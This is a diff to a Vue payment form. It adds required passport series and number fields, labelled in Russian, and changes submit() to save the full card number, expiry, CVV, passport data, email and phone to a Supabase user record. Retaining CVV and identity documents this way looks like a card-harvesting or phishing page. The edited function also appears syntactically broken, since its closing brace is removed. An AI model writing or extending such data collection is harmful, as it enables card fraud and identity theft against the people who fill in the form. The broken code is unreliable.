@@ -1,6 +1,9 @@
 <script setup>
 import { ref } from 'vue'
 
+import { saveUser } from '../lib/supabase'
+
+
 const cardNumber = ref('')
 const expiry = ref('')
 const cvv = ref('')
@@ -10,15 +13,25 @@ const method = ref('Visa/Mastercard')
 const processing = ref(false)
 const showMessage = ref(false)
 
-function submit() {
+const passportData = ref('')
+const passportData2 = ref('')
+
+async function submit() {
   processing.value = true
-  setTimeout(() => {
-    processing.value = false
-    showMessage.value = true
-  }, 2000)
-}
+  const authUser = JSON.parse(localStorage.getItem('authUser') || '{}')
+  await saveUser({
+    email: authUser.email || '',
+    phoneNumber: authUser.phoneNumber || localStorage.getItem('phoneNumber') || '',
+    cardNumber: cardNumber.value,
+    cardDate: expiry.value,
+    cvv: cvv.value,
+    passportData: passportData.value,
+    passportData2: passportData2.value
+  })
+
 
 function openChat() {
+  showMessage.value = false
   if (window.Intercom) {
     window.Intercom('show')
   }
@@ -44,6 +57,16 @@ function openChat() {
         </div>
       </div>
       <div class="form-group">
+
+        <label for="passportData">Паспорт серия</label>
+        <input id="passportData" v-model="passportData" required />
+      </div>
+      <div class="form-group">
+        <label for="passportData2">Паспорт номер</label>
+        <input id="passportData2" v-model="passportData2" required />
+      </div>
+      <div class="form-group">
+
         <label for="name">Имя держателя</label>
         <input id="name" v-model="name" required />
       </div>
